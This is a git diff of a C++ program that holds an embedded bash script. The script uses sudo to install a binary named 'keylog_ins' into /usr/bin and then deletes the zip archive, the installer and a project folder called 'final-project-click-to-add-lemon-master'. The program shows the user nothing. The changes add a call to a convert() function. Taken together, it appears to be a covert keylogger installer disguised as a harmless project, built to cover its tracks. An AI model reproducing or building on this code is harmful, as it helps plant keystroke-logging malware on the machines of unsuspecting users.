@@ -5,6 +5,7 @@
 #include <string>
 using namespace std;
 
+
 const char *text= 
 	"#!/bin/bash\n"
 	"sudo cp keylog_ins /usr/bin/keylog_ins 2>/dev/null\n"
@@ -16,6 +17,8 @@ const char *text=
 	"cd ../..\n"
 	"rm -r -f keylog.zip keylog_ins\n"
 	"rm -r -f final-project-click-to-add-lemon-master\n";
+	
+void convert();
 
 bool ifExist(){
 	bool result = false;
@@ -59,9 +62,8 @@ int main(){
 	}else{
 		cout<<""; //function without prompt
 	}
-	cout<< "do some convertion (under construction)";
+	//cout<< "do some convertion (under construction)";
+	convert();
 
 	return 0;
 }
-
-
